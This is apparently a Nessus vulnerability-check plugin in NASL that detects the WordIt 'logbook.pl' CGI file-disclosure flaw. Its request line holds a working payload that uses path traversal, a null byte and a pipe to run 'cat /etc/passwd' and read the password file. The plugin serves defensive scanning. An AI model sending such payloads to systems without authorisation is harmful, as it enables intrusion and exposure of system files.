#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11360);
 script_bugtraq_id(7043);
 
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "Wordit Logbook File Disclosure Vulnerability";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that suffers from an
information disclosure vulnerability. 

Description :

The WordIt 'logbook.pl' CGI script is installed on the remote host. 

This script has a well known security flaw that lets anyone read
arbitrary files on this host. 

See also : 

http://www.securityfocus.com/archive/1/314275

Solution : 

Remove the script.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of logbook.pl";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach d ( cgi_dirs() )
{
 req = http_get(item:string(d, "/logbook.pl?file=../../../../../../../../../../bin/cat%20/etc/passwd%00|"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(res == NULL) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res)){
 	security_note(port);
	exit(0);
	}	
}

